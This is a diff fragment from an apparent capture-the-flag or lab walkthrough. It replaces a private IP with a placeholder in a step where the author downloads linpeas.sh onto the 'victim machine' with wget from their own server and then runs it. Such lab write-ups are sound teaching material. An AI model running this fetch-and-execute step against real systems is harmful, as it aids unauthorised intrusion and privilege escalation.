@@ -163,7 +163,7 @@ This creates a server at the default port **8000**.
 In the victim machine, I used
 
 ```
-wget http://10.4.6.205:8000/linpeas.sh
+wget http://<YOUR IP_HERE>/linpeas.sh
 ```
 
 After successfully downloading, I just had to make it an executable before I could run it! 
